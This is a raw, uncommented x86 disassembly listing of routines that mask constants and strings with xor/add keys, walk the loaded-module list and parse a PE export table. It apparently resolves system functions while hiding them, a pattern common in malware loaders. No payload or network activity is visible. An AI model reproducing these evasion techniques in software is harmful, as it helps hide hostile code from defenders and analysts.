  426735:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  42673c:	mov    DWORD PTR [ebp-0x10],eax
  42673f:	mov    eax,DWORD PTR [ebp+0x8]
  426742:	mov    DWORD PTR [ebp-0x14],eax
  426745:	mov    eax,DWORD PTR [ebp-0xc]
  426748:	push   ebx
  426749:	mov    ecx,0x75108b1
  42674e:	xor    eax,ecx
  426750:	push   esi
  426751:	mov    esi,DWORD PTR [ebp-0x10]
  426754:	mov    edx,0x3272f8
  426759:	add    eax,edx
  42675b:	push   edi
  42675c:	cmp    esi,eax
  42675e:	je     0x42693d
  426764:	mov    eax,DWORD PTR [ebp-0xc]
  426767:	mov    esi,DWORD PTR [ebp-0x14]
  42676a:	xor    eax,ecx
  42676c:	add    eax,edx
  42676e:	cmp    esi,eax
  426770:	je     0x42693d
  426776:	mov    eax,DWORD PTR [ebp-0xc]
  426779:	xor    eax,ecx
  42677b:	add    eax,edx
  42677d:	mov    DWORD PTR [ebp-0x24],eax
  426780:	mov    eax,DWORD PTR [ebp-0xc]
  426783:	xor    eax,ecx
  426785:	add    eax,edx
  426787:	mov    DWORD PTR [ebp-0x28],eax
  42678a:	mov    edi,DWORD PTR [ebp-0x20]
  42678d:	mov    ebx,DWORD PTR [ebp-0x8]
  426790:	mov    esi,0x8b1
  426795:	xor    edi,esi
  426797:	mov    eax,0x72f8
  42679c:	xor    ebx,esi
  42679e:	add    edi,eax
  4267a0:	add    ebx,eax
  4267a2:	sub    ebx,edi
  4267a4:	mov    WORD PTR [ebp-0x8],bx
  4267a8:	jmp    0x42686d
  4267ad:	mov    edi,DWORD PTR [ebp-0xc]
  4267b0:	mov    bx,WORD PTR [ebp-0x4]
  4267b4:	xor    edi,esi
  4267b6:	add    edi,eax
  4267b8:	cmp    bx,di
  4267bb:	je     0x4268af
  4267c1:	mov    edi,DWORD PTR [ebp-0xc]
  4267c4:	mov    ebx,DWORD PTR [ebp+0xc]
  4267c7:	xor    edi,ecx
  4267c9:	add    edi,edx
  4267cb:	cmp    ebx,edi
  4267cd:	mov    di,WORD PTR [ebp-0x4]
  4267d1:	mov    bx,WORD PTR [ebp+0x8]
  4267d5:	je     0x426840
  4267d7:	cmp    bx,di
  4267da:	je     0x426849
  4267dc:	mov    edi,DWORD PTR [ebp-0x20]
  4267df:	mov    bx,WORD PTR [ebp+0x8]
  4267e3:	xor    edi,esi
  4267e5:	add    edi,eax
  4267e7:	cmp    bx,di
  4267ea:	jb     0x42680a
  4267ec:	mov    edi,DWORD PTR [ebp-0x2c]
  4267ef:	mov    bx,WORD PTR [ebp+0x8]
  4267f3:	xor    edi,esi
  4267f5:	add    edi,eax
  4267f7:	cmp    bx,di
  4267fa:	ja     0x42680a
  4267fc:	movzx  edi,WORD PTR [ebp+0x8]
  426800:	movzx  ebx,WORD PTR [ebp-0x8]
  426804:	add    edi,ebx
  426806:	mov    WORD PTR [ebp+0x8],di
  42680a:	mov    edi,DWORD PTR [ebp-0x20]
  42680d:	mov    bx,WORD PTR [ebp-0x4]
  426811:	xor    edi,esi
  426813:	add    edi,eax
  426815:	cmp    bx,di
  426818:	jb     0x426838
  42681a:	mov    edi,DWORD PTR [ebp-0x2c]
  42681d:	mov    bx,WORD PTR [ebp-0x4]
  426821:	xor    edi,esi
  426823:	add    edi,eax
  426825:	cmp    bx,di
  426828:	ja     0x426838
  42682a:	movzx  edi,WORD PTR [ebp-0x4]
  42682e:	movzx  ebx,WORD PTR [ebp-0x8]
  426832:	add    edi,ebx
  426834:	mov    WORD PTR [ebp-0x4],di
  426838:	mov    di,WORD PTR [ebp-0x4]
  42683c:	mov    bx,WORD PTR [ebp+0x8]
  426840:	cmp    bx,di
  426843:	jne    0x42693d
  426849:	mov    edi,DWORD PTR [ebp-0x1c]
  42684c:	mov    ebx,DWORD PTR [ebp-0x10]
  42684f:	xor    edi,ecx
  426851:	lea    edi,[edi+ebx*1+0x3272f8]
  426858:	mov    DWORD PTR [ebp-0x10],edi
  42685b:	mov    edi,DWORD PTR [ebp-0x1c]
  42685e:	mov    ebx,DWORD PTR [ebp-0x14]
  426861:	xor    edi,ecx
  426863:	lea    edi,[edi+ebx*1+0x3272f8]
  42686a:	mov    DWORD PTR [ebp-0x14],edi
  42686d:	mov    edi,DWORD PTR [ebp-0x24]
  426870:	mov    ebx,DWORD PTR [ebp-0x10]
  426873:	mov    di,WORD PTR [ebx+edi*2]
  426877:	mov    WORD PTR [ebp+0x8],di
  42687b:	mov    edi,DWORD PTR [ebp-0x28]
  42687e:	mov    ebx,DWORD PTR [ebp-0x14]
  426881:	mov    di,WORD PTR [ebx+edi*2]
  426885:	mov    WORD PTR [ebp-0x4],di
  426889:	mov    edi,DWORD PTR [ebp-0xc]
  42688c:	mov    bx,WORD PTR [ebp+0x8]
  426890:	xor    edi,esi
  426892:	add    edi,eax
  426894:	cmp    bx,di
  426897:	jne    0x4267ad
  42689d:	mov    eax,DWORD PTR [ebp-0x18]
  4268a0:	mov    esi,DWORD PTR [ebp-0xc]
  4268a3:	xor    eax,ecx
  4268a5:	add    eax,edx
  4268a7:	imul   eax,esi
  4268aa:	mov    DWORD PTR [ebp-0xc],eax
  4268ad:	jmp    0x4268c1
  4268af:	mov    eax,DWORD PTR [ebp-0xc]
  4268b2:	mov    esi,DWORD PTR [ebp-0x18]
  4268b5:	xor    eax,ecx
  4268b7:	lea    eax,[eax+esi*1+0x3272f8]
  4268be:	mov    DWORD PTR [ebp-0x18],eax
  4268c1:	mov    eax,DWORD PTR [ebp-0x24]
  4268c4:	sub    eax,edx
  4268c6:	xor    eax,ecx
  4268c8:	mov    DWORD PTR [ebp-0x30],eax
  4268cb:	mov    eax,DWORD PTR [ebp-0x28]
  4268ce:	sub    eax,edx
  4268d0:	xor    eax,ecx
  4268d2:	mov    DWORD PTR [ebp-0x34],eax
  4268d5:	mov    eax,DWORD PTR [ebp-0x34]
  4268d8:	mov    esi,DWORD PTR [ebp-0x1c]
  4268db:	xor    esi,ecx
  4268dd:	add    esi,edx
  4268df:	xor    eax,ecx
  4268e1:	add    eax,0x3272f8
  4268e6:	imul   esi,eax
  4268e9:	mov    eax,DWORD PTR [ebp-0x14]
  4268ec:	movzx  eax,WORD PTR [esi+eax*1]
  4268f0:	mov    esi,DWORD PTR [ebp-0x30]
  4268f3:	mov    edi,DWORD PTR [ebp-0x1c]
  4268f6:	xor    esi,ecx
  4268f8:	add    esi,edx
  4268fa:	xor    edi,ecx
  4268fc:	add    edi,edx
  4268fe:	imul   edi,esi
  426901:	mov    esi,DWORD PTR [ebp-0x10]
  426904:	movzx  esi,WORD PTR [edi+esi*1]
  426908:	sub    eax,edx
  42690a:	sub    esi,edx
  42690c:	xor    eax,ecx
  42690e:	xor    esi,ecx
  426910:	cmp    esi,eax
  426912:	jne    0x42693d
  426914:	mov    eax,DWORD PTR [ebp-0x30]
  426917:	mov    esi,DWORD PTR [ebp-0x1c]
  42691a:	xor    eax,ecx
  42691c:	add    eax,0x3272f8
  426921:	xor    esi,ecx
  426923:	add    esi,edx
  426925:	imul   esi,eax
  426928:	mov    eax,DWORD PTR [ebp-0x10]
  42692b:	movzx  eax,WORD PTR [esi+eax*1]
  42692f:	mov    esi,DWORD PTR [ebp-0xc]
  426932:	sub    eax,edx
  426934:	xor    eax,ecx
  426936:	cmp    eax,esi
  426938:	mov    eax,DWORD PTR [ebp-0xc]
  42693b:	je     0x426940
  42693d:	mov    eax,DWORD PTR [ebp-0x18]
  426940:	pop    edi
  426941:	xor    eax,ecx
  426943:	pop    esi
  426944:	add    eax,edx
  426946:	pop    ebx
  426947:	leave  
  426948:	ret    0x8
  42694b:	push   ebp
  42694c:	mov    ebp,esp
  42694e:	push   ecx
  42694f:	mov    cx,WORD PTR [eax]
  426952:	push   esi
  426953:	mov    esi,0x3b5e
  426958:	sub    cx,si
  42695b:	mov    esi,0x8a9c
  426960:	xor    cx,si
  426963:	mov    esi,0x4e3e
  426968:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42696f:	mov    edx,0xf89c85b9
  426974:	cmp    cx,si
  426977:	je     0x4269d6
  426979:	push   ebx
  42697a:	push   edi
  42697b:	movzx  ecx,cx
  42697e:	mov    edi,0xffcd8d08
  426983:	mov    esi,0x75108b1
  426988:	mov    ebx,0x4e62
  42698d:	cmp    cx,bx
  426990:	jne    0x426995
  426992:	mov    DWORD PTR [ebp-0x4],edx
  426995:	lea    edx,[edi+0x1]
  426998:	xor    edx,esi
  42699a:	mov    edi,edx
  42699c:	xor    edi,esi
  42699e:	mov    cx,WORD PTR [eax+edi*2+0x64e5f0]
  4269a6:	mov    ebx,0x3b5e
  4269ab:	sub    cx,bx
  4269ae:	mov    ebx,0x8a9c
  4269b3:	xor    cx,bx
  4269b6:	mov    ebx,0x4e3e
  4269bb:	cmp    cx,bx
  4269be:	jne    0x426988
  4269c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4269c3:	pop    edi
  4269c4:	pop    ebx
  4269c5:	cmp    ecx,0xf89c85b6
  4269cb:	je     0x4269d6
  4269cd:	xor    ecx,esi
  4269cf:	lea    eax,[eax+ecx*2+0x64e5f2]
  4269d6:	pop    esi
  4269d7:	leave  
  4269d8:	ret    
  4269d9:	push   ebp
  4269da:	mov    ebp,esp
  4269dc:	push   ecx
  4269dd:	push   esi
  4269de:	push   edi
  4269df:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4269e6:	mov    esi,0xf89c85b9
  4269eb:	call   0x42694b
  4269f0:	mov    edi,eax
  4269f2:	mov    al,BYTE PTR [edi]
  4269f4:	sub    al,0x5
  4269f6:	xor    al,0x80
  4269f8:	cmp    al,0x7b
  4269fa:	je     0x426a5d
  4269fc:	mov    eax,edi
  4269fe:	mov    edx,0xffcd8d08
  426a03:	mov    ecx,0x75108b1
  426a08:	push   ebx
  426a09:	mov    ax,WORD PTR [eax]
  426a0c:	mov    ebx,0x3b5e
  426a11:	sub    ax,bx
  426a14:	mov    ebx,0x8a9c
  426a19:	xor    ax,bx
  426a1c:	mov    ebx,0x4e4c
  426a21:	cmp    ax,bx
  426a24:	jne    0x426a29
  426a26:	mov    DWORD PTR [ebp-0x4],esi
  426a29:	lea    esi,[edx+0x1]
  426a2c:	xor    esi,ecx
  426a2e:	mov    edx,esi
  426a30:	xor    edx,ecx
  426a32:	lea    eax,[edi+edx*2+0x64e5f0]
  426a39:	mov    bl,BYTE PTR [eax]
  426a3b:	sub    bl,0x5
  426a3e:	xor    bl,0x80
  426a41:	cmp    bl,0x7b
  426a44:	jne    0x426a09
  426a46:	mov    eax,DWORD PTR [ebp-0x4]
  426a49:	pop    ebx
  426a4a:	cmp    eax,0xf89c85b6
  426a4f:	je     0x426a5d
  426a51:	xor    eax,ecx
  426a53:	xor    ecx,ecx
  426a55:	mov    WORD PTR [edi+eax*2+0x64e5f0],cx
  426a5d:	mov    eax,edi
  426a5f:	pop    edi
  426a60:	pop    esi
  426a61:	leave  
  426a62:	ret    
  426a63:	push   ebp
  426a64:	mov    ebp,esp
  426a66:	push   ecx
  426a67:	push   esi
  426a68:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  426a6f:	mov    esi,0xf89c85b9
  426a74:	call   0x42694b
  426a79:	mov    cx,WORD PTR [eax]
  426a7c:	mov    edx,0x3b5e
  426a81:	sub    cx,dx
  426a84:	mov    edx,0x8a9c
  426a89:	xor    cx,dx
  426a8c:	mov    edx,0x4e3e
  426a91:	cmp    cx,dx
  426a94:	je     0x426aed
  426a96:	push   ebx
  426a97:	push   edi
  426a98:	movzx  ecx,cx
  426a9b:	mov    edx,0xffcd8d08
  426aa0:	mov    edi,0x75108b1
  426aa5:	mov    ebx,0x4e4c
  426aaa:	cmp    cx,bx
  426aad:	jne    0x426ab2
  426aaf:	mov    DWORD PTR [ebp-0x4],esi
  426ab2:	lea    esi,[edx+0x1]
  426ab5:	xor    esi,edi
  426ab7:	mov    edx,esi
  426ab9:	xor    edx,edi
  426abb:	mov    cx,WORD PTR [eax+edx*2+0x64e5f0]
  426ac3:	mov    ebx,0x3b5e
  426ac8:	sub    cx,bx
  426acb:	mov    ebx,0x8a9c
  426ad0:	xor    cx,bx
  426ad3:	mov    ebx,0x4e3e
  426ad8:	cmp    cx,bx
  426adb:	jne    0x426aa5
  426add:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  426ae4:	pop    edi
  426ae5:	pop    ebx
  426ae6:	je     0x426aed
  426ae8:	xor    eax,eax
  426aea:	inc    eax
  426aeb:	jmp    0x426aef
  426aed:	xor    eax,eax
  426aef:	pop    esi
  426af0:	leave  
  426af1:	ret    
  426af2:	push   ebp
  426af3:	mov    ebp,esp
  426af5:	push   ecx
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	movzx  ecx,WORD PTR [eax]
  426afc:	push   esi
  426afd:	lea    eax,[ecx-0x3b5e]
  426b03:	mov    esi,0x8a9c
  426b08:	push   edi
  426b09:	xor    eax,esi
  426b0b:	mov    edi,0x4e3e
  426b10:	mov    DWORD PTR [ebp-0x4],edx
  426b13:	cmp    ax,di
  426b16:	je     0x426b43
  426b18:	mov    eax,DWORD PTR [ebp+0x8]
  426b1b:	sub    eax,edx
  426b1d:	mov    DWORD PTR [ebp+0x8],eax
  426b20:	jmp    0x426b25
  426b22:	mov    eax,DWORD PTR [ebp+0x8]
  426b25:	mov    WORD PTR [edx],cx
  426b28:	add    edx,0x2
  426b2b:	movzx  edi,WORD PTR [eax+edx*1]
  426b2f:	mov    ecx,edi
  426b31:	add    edi,0xffffc4a2
  426b37:	xor    edi,esi
  426b39:	mov    eax,0x4e3e
  426b3e:	cmp    di,ax
  426b41:	jne    0x426b22
  426b43:	xor    eax,eax
  426b45:	pop    edi
  426b46:	mov    WORD PTR [edx],ax
  426b49:	mov    eax,DWORD PTR [ebp-0x4]
  426b4c:	pop    esi
  426b4d:	leave  
  426b4e:	ret    0x4
  426b51:	push   ebp
  426b52:	mov    ebp,esp
  426b54:	sub    esp,0x18
  426b57:	mov    DWORD PTR [ebp-0x8],0xf89c85b9
  426b5e:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  426b65:	mov    ecx,DWORD PTR [ebp-0x8]
  426b68:	push   esi
  426b69:	mov    eax,0x75108b1
  426b6e:	xor    ecx,eax
  426b70:	mov    esi,0x3272f8
  426b75:	add    ecx,esi
  426b77:	mov    DWORD PTR [ebp-0x4],ecx
  426b7a:	mov    DWORD PTR [ebp-0xc],0xf89c85a1
  426b81:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  426b88:	push   edi
  426b89:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  426b90:	jmp    0x426c31
  426b95:	mov    ecx,DWORD PTR [ebp-0x4]
  426b98:	mov    edx,DWORD PTR [ebp+0x10]
  426b9b:	sub    edx,ecx
  426b9d:	mov    ecx,DWORD PTR [ebp-0xc]
  426ba0:	xor    ecx,eax
  426ba2:	add    ecx,esi
  426ba4:	cmp    edx,ecx
  426ba6:	jbe    0x426bc3
  426ba8:	mov    edx,DWORD PTR [ebp-0x4]
  426bab:	add    edx,DWORD PTR [ebp+0x8]
  426bae:	mov    ecx,DWORD PTR [ebp-0x4]
  426bb1:	add    ecx,DWORD PTR [ebp+0xc]
  426bb4:	mov    edi,DWORD PTR [ecx]
  426bb6:	mov    DWORD PTR [edx],edi
  426bb8:	mov    ecx,DWORD PTR [ecx+0x4]
  426bbb:	mov    DWORD PTR [edx+0x4],ecx
  426bbe:	mov    ecx,DWORD PTR [ebp-0xc]
  426bc1:	jmp    0x426c10
  426bc3:	mov    ecx,DWORD PTR [ebp-0x4]
  426bc6:	mov    edx,DWORD PTR [ebp+0x10]
  426bc9:	sub    edx,ecx
  426bcb:	mov    ecx,DWORD PTR [ebp-0x10]
  426bce:	xor    ecx,eax
  426bd0:	add    ecx,esi
  426bd2:	cmp    edx,ecx
  426bd4:	mov    ecx,DWORD PTR [ebp-0x4]
  426bd7:	jbe    0x426beb
  426bd9:	add    ecx,DWORD PTR [ebp+0x8]
  426bdc:	mov    edx,DWORD PTR [ebp-0x4]
  426bdf:	add    edx,DWORD PTR [ebp+0xc]
  426be2:	mov    edx,DWORD PTR [edx]
  426be4:	mov    DWORD PTR [ecx],edx
  426be6:	mov    ecx,DWORD PTR [ebp-0x10]
  426be9:	jmp    0x426c10
  426beb:	mov    edx,DWORD PTR [ebp+0x10]
  426bee:	sub    edx,ecx
  426bf0:	mov    ecx,DWORD PTR [ebp-0x14]
  426bf3:	xor    ecx,eax
  426bf5:	add    ecx,esi
  426bf7:	cmp    edx,ecx
  426bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  426bfc:	jbe    0x426c21
  426bfe:	add    ecx,DWORD PTR [ebp+0x8]
  426c01:	mov    edx,DWORD PTR [ebp-0x4]
  426c04:	add    edx,DWORD PTR [ebp+0xc]
  426c07:	mov    dx,WORD PTR [edx]
  426c0a:	mov    WORD PTR [ecx],dx
  426c0d:	mov    ecx,DWORD PTR [ebp-0x14]
  426c10:	mov    edx,DWORD PTR [ebp-0x4]
  426c13:	xor    ecx,eax
  426c15:	lea    ecx,[ecx+edx*1+0x3272f8]
  426c1c:	mov    DWORD PTR [ebp-0x4],ecx
  426c1f:	jmp    0x426c31
  426c21:	add    ecx,DWORD PTR [ebp+0x8]
  426c24:	mov    edx,DWORD PTR [ebp-0x4]
  426c27:	add    edx,DWORD PTR [ebp+0xc]
  426c2a:	mov    dl,BYTE PTR [edx]
  426c2c:	mov    BYTE PTR [ecx],dl
  426c2e:	inc    DWORD PTR [ebp-0x4]
  426c31:	mov    ecx,DWORD PTR [ebp-0x18]
  426c34:	mov    edx,DWORD PTR [ebp+0x10]
  426c37:	xor    ecx,eax
  426c39:	add    ecx,esi
  426c3b:	imul   ecx,edx
  426c3e:	mov    edx,DWORD PTR [ebp-0x8]
  426c41:	mov    edi,DWORD PTR [ebp-0x4]
  426c44:	xor    edx,eax
  426c46:	lea    edx,[edx+edi*1+0x3272f8]
  426c4d:	cmp    edx,ecx
  426c4f:	jb     0x426b95
  426c55:	pop    edi
  426c56:	pop    esi
  426c57:	leave  
  426c58:	ret    0xc
  426c5b:	push   ebp
  426c5c:	mov    ebp,esp
  426c5e:	sub    esp,0xc
  426c61:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  426c68:	push   esi
  426c69:	mov    esi,eax
  426c6b:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  426c72:	mov    edx,DWORD PTR [ebp-0x4]
  426c75:	mov    eax,0x75108b1
  426c7a:	xor    edx,eax
  426c7c:	mov    ecx,0x3272f8
  426c81:	add    edx,ecx
  426c83:	cmp    esi,edx
  426c85:	je     0x426cc7
  426c87:	push   ebx
  426c88:	push   edi
  426c89:	mov    edx,DWORD PTR [ebp-0x8]
  426c8c:	mov    ebx,DWORD PTR [ebp+0x8]
  426c8f:	xor    edx,eax
  426c91:	mov    edi,0xffcd8d08
  426c96:	sub    edi,edx
  426c98:	add    esi,edi
  426c9a:	lea    edx,[esi-0x3272f8]
  426ca0:	xor    edx,eax
  426ca2:	mov    DWORD PTR [ebp-0xc],edx
  426ca5:	mov    edx,DWORD PTR [ebp-0x4]
  426ca8:	mov    edi,DWORD PTR [ebp-0xc]
  426cab:	xor    dl,0xb1
  426cae:	sub    dl,0x8
  426cb1:	xor    edi,eax
  426cb3:	mov    BYTE PTR [edi+ebx*1+0x3272f8],dl
  426cba:	mov    edx,DWORD PTR [ebp-0x4]
  426cbd:	xor    edx,eax
  426cbf:	add    edx,ecx
  426cc1:	cmp    esi,edx
  426cc3:	jne    0x426c89
  426cc5:	pop    edi
  426cc6:	pop    ebx
  426cc7:	pop    esi
  426cc8:	leave  
  426cc9:	ret    0x4
  426ccc:	push   ebp
  426ccd:	mov    ebp,esp
  426ccf:	sub    esp,0x21c
  426cd5:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  426cdc:	mov    DWORD PTR [ebp-0x14],0xf89c85b8
  426ce3:	mov    eax,DWORD PTR [ebp+0x10]
  426ce6:	mov    eax,DWORD PTR [ebp-0x4]
  426ce9:	mov    ecx,DWORD PTR [ebp+0x8]
  426cec:	push   esi
  426ced:	push   edi
  426cee:	mov    edi,0x75108b1
  426cf3:	xor    eax,edi
  426cf5:	mov    esi,0x3272f8
  426cfa:	add    eax,esi
  426cfc:	cmp    eax,ecx
  426cfe:	mov    eax,DWORD PTR [ebp-0x4]
  426d01:	jne    0x426d0c
  426d03:	xor    eax,edi
  426d05:	add    eax,esi
  426d07:	jmp    0x426db8
  426d0c:	mov    ecx,DWORD PTR [ebp+0xc]
  426d0f:	xor    eax,edi
  426d11:	add    eax,esi
  426d13:	cmp    eax,ecx
  426d15:	jne    0x426d1c
  426d17:	mov    eax,DWORD PTR [ebp-0x4]
  426d1a:	jmp    0x426d03
  426d1c:	lea    eax,[ebp-0x21c]
  426d22:	mov    DWORD PTR [ebp-0x8],eax
  426d25:	mov    eax,DWORD PTR [ebp+0xc]
  426d28:	mov    DWORD PTR [ebp-0x10],eax
  426d2b:	mov    eax,DWORD PTR [ebp-0x4]
  426d2e:	xor    eax,edi
  426d30:	add    eax,esi
  426d32:	mov    DWORD PTR [ebp+0x10],eax
  426d35:	mov    eax,DWORD PTR [ebp+0xc]
  426d38:	push   ebx
  426d39:	call   0x426a63
  426d3e:	mov    ebx,eax
  426d40:	mov    eax,DWORD PTR [ebp+0x8]
  426d43:	mov    eax,DWORD PTR [eax+0x14]
  426d46:	jmp    0x426da0
  426d48:	mov    eax,DWORD PTR [ebp+0xc]
  426d4b:	sub    eax,0x8
  426d4e:	mov    DWORD PTR [ebp-0xc],eax
  426d51:	mov    eax,DWORD PTR [ebp-0xc]
  426d54:	mov    eax,DWORD PTR [eax+0x28]
  426d57:	call   0x42694b
  426d5c:	mov    DWORD PTR [ebp+0x10],eax
  426d5f:	push   DWORD PTR [ebp+0x10]
  426d62:	mov    edx,DWORD PTR [ebp-0x8]
  426d65:	call   0x426af2
  426d6a:	mov    eax,DWORD PTR [ebp-0x4]
  426d6d:	xor    eax,edi
  426d6f:	add    eax,esi
  426d71:	cmp    eax,ebx
  426d73:	jne    0x426d7d
  426d75:	mov    eax,DWORD PTR [ebp-0x8]
  426d78:	call   0x4269d9
  426d7d:	mov    eax,DWORD PTR [ebp-0x14]
  426d80:	xor    eax,edi
  426d82:	add    eax,esi
  426d84:	push   eax
  426d85:	push   DWORD PTR [ebp-0x10]
  426d88:	mov    eax,DWORD PTR [ebp-0x8]
  426d8b:	call   0x426705
  426d90:	mov    ecx,DWORD PTR [ebp-0x4]
  426d93:	xor    ecx,edi
  426d95:	add    ecx,esi
  426d97:	cmp    eax,ecx
  426d99:	je     0x426dbe
  426d9b:	mov    eax,DWORD PTR [ebp+0xc]
  426d9e:	mov    eax,DWORD PTR [eax]
  426da0:	mov    DWORD PTR [ebp+0xc],eax
  426da3:	mov    eax,DWORD PTR [ebp+0x8]
  426da6:	mov    ecx,DWORD PTR [ebp+0xc]
  426da9:	add    eax,0x14
  426dac:	cmp    ecx,eax
  426dae:	jne    0x426d48
  426db0:	mov    eax,DWORD PTR [ebp-0x4]
  426db3:	xor    eax,edi
  426db5:	add    eax,esi
  426db7:	pop    ebx
  426db8:	pop    edi
  426db9:	pop    esi
  426dba:	leave  
  426dbb:	ret    0xc
  426dbe:	mov    eax,DWORD PTR [ebp-0xc]
  426dc1:	mov    eax,DWORD PTR [eax+0x18]
  426dc4:	jmp    0x426db7
  426dc6:	push   ebp
  426dc7:	mov    ebp,esp
  426dc9:	mov    eax,DWORD PTR [ebp+0xc]
  426dcc:	sub    esp,0x10
  426dcf:	cmp    DWORD PTR [ebp+0x8],0x0
  426dd3:	push   ebx
  426dd4:	push   esi
  426dd5:	push   edi
  426dd6:	je     0x426e8b
  426ddc:	test   eax,eax
  426dde:	je     0x426e8b
  426de4:	movzx  eax,WORD PTR [eax+0x20]
  426de8:	mov    ecx,eax
  426dea:	mov    DWORD PTR [ebp-0x10],eax
  426ded:	xor    edx,edx
  426def:	and    DWORD PTR [ebp-0x8],edx
  426df2:	mov    eax,0x8a9c
  426df7:	xor    ecx,eax
  426df9:	add    ecx,0x3b5e
  426dff:	mov    DWORD PTR [ebp-0xc],ecx
  426e02:	and    DWORD PTR [ebp-0x4],0x0
  426e06:	xor    ecx,ecx
  426e08:	push   0x7d
  426e0a:	pop    edi
  426e0b:	cmp    cx,WORD PTR [ebp-0xc]
  426e0f:	jae    0x426e75
  426e11:	lea    esi,[edx-0x3b5e]
  426e17:	xor    esi,eax
  426e19:	movzx  ecx,WORD PTR [ebp-0x4]
  426e1d:	mov    ebx,DWORD PTR [ebp+0xc]
  426e20:	lea    ecx,[ebx+ecx*4]
  426e23:	cmp    WORD PTR [ecx+0x2],si
  426e27:	jne    0x426e60
  426e29:	movzx  ecx,WORD PTR [ecx]
  426e2c:	mov    edi,0x4e3e
  426e31:	cmp    cx,di
  426e34:	jne    0x426e42
  426e36:	mov    ebx,DWORD PTR [ebp+0x8]
  426e39:	movzx  edi,dx
  426e3c:	cmp    BYTE PTR [edi+ebx*1],0x0
  426e40:	je     0x426e6f
  426e42:	mov    ebx,DWORD PTR [ebp+0x8]
  426e45:	movzx  edi,dx
  426e48:	movsx  di,BYTE PTR [edi+ebx*1]
  426e4d:	mov    ebx,0x3b5e
  426e52:	sub    di,bx
  426e55:	xor    di,ax
  426e58:	cmp    cx,di
  426e5b:	je     0x426e6f
  426e5d:	push   0x7b
  426e5f:	pop    edi
  426e60:	inc    DWORD PTR [ebp-0x4]
  426e63:	mov    cx,WORD PTR [ebp-0xc]
  426e67:	cmp    WORD PTR [ebp-0x4],cx
  426e6b:	jb     0x426e19
  426e6d:	jmp    0x426e75
  426e6f:	inc    DWORD PTR [ebp-0x8]
  426e72:	push   0x7c
  426e74:	pop    edi
  426e75:	mov    esi,DWORD PTR [ebp+0x8]
  426e78:	movzx  ecx,dx
  426e7b:	cmp    BYTE PTR [ecx+esi*1],0x0
  426e7f:	je     0x426e94
  426e81:	inc    edx
  426e82:	cmp    edi,0x7b
  426e85:	jne    0x426e02
  426e8b:	xor    eax,eax
  426e8d:	pop    edi
  426e8e:	pop    esi
  426e8f:	pop    ebx
  426e90:	leave  
  426e91:	ret    0x8
  426e94:	mov    ecx,DWORD PTR [ebp-0x8]
  426e97:	add    ecx,0xffffc4a2
  426e9d:	xor    cx,ax
  426ea0:	xor    eax,eax
  426ea2:	cmp    cx,WORD PTR [ebp-0x10]
  426ea6:	sete   al
  426ea9:	jmp    0x426e8d
  426eab:	push   ebp
  426eac:	mov    ebp,esp
  426eae:	sub    esp,0x50
  426eb1:	push   edi
  426eb2:	mov    edi,eax
  426eb4:	mov    eax,DWORD PTR [edi+0x1a8]
  426eba:	cmp    DWORD PTR [eax],0x0
  426ebd:	jne    0x426ec6
  426ebf:	xor    eax,eax
  426ec1:	jmp    0x426ff7
  426ec6:	push   DWORD PTR [ebp+0x8]
  426ec9:	push   0x2c
  426ecb:	pop    eax
  426ecc:	call   0x426c5b
  426ed1:	mov    edx,DWORD PTR [edi+0x1ac]
  426ed7:	lea    eax,[edi+0x22]
  426eda:	mov    DWORD PTR [ebp-0x4c],eax
  426edd:	lea    eax,[edi+0x44]
  426ee0:	mov    DWORD PTR [ebp-0x48],eax
  426ee3:	lea    eax,[edi+0x66]
  426ee6:	mov    DWORD PTR [ebp-0x44],eax
  426ee9:	lea    eax,[edi+0x88]
  426eef:	mov    DWORD PTR [ebp-0x40],eax
  426ef2:	lea    eax,[edi+0xaa]
  426ef8:	mov    DWORD PTR [ebp-0x3c],eax
  426efb:	lea    eax,[edi+0xcc]
  426f01:	mov    DWORD PTR [ebp-0x38],eax
  426f04:	lea    eax,[edi+0xee]
  426f0a:	mov    DWORD PTR [ebp-0x34],eax
  426f0d:	lea    eax,[edi+0x110]
  426f13:	mov    DWORD PTR [ebp-0x30],eax
  426f16:	lea    eax,[edi+0x132]
  426f1c:	mov    DWORD PTR [ebp-0x2c],eax
  426f1f:	lea    eax,[edi+0x154]
  426f25:	push   edi
  426f26:	mov    DWORD PTR [ebp-0x50],edi
  426f29:	mov    DWORD PTR [ebp-0x28],eax
  426f2c:	call   0x42702b
  426f31:	push   eax
  426f32:	mov    eax,DWORD PTR [edi+0x1a8]
  426f38:	push   DWORD PTR [eax]
  426f3a:	call   0x426ccc
  426f3f:	mov    DWORD PTR [ebp-0x10],eax
  426f42:	test   eax,eax
  426f44:	je     0x426ff7
  426f4a:	mov    ecx,DWORD PTR [eax+0x3c]
  426f4d:	push   ebx
  426f4e:	push   esi
  426f4f:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426f53:	add    esi,eax
  426f55:	mov    edi,DWORD PTR [esi+0x24]
  426f58:	mov    ecx,DWORD PTR [esi+0x1c]
  426f5b:	mov    edx,DWORD PTR [esi+0x20]
  426f5e:	mov    ebx,DWORD PTR [esi+0x18]
  426f61:	add    edi,eax
  426f63:	mov    DWORD PTR [ebp-0x20],edi
  426f66:	mov    edi,DWORD PTR [esi+0x14]
  426f69:	add    ecx,eax
  426f6b:	add    edx,eax
  426f6d:	mov    DWORD PTR [ebp-0xc],ecx
  426f70:	mov    DWORD PTR [ebp-0x1c],edx
  426f73:	mov    DWORD PTR [ebp-0x8],edi
  426f76:	cmp    edi,ebx
  426f78:	ja     0x426f7d
  426f7a:	mov    DWORD PTR [ebp-0x8],ebx
  426f7d:	xor    ebx,ebx
  426f7f:	mov    DWORD PTR [ebp-0x18],ebx
  426f82:	cmp    DWORD PTR [ebp-0x8],ebx
  426f85:	jbe    0x426ff5
  426f87:	jmp    0x426f8c
  426f89:	mov    edx,DWORD PTR [ebp-0x1c]
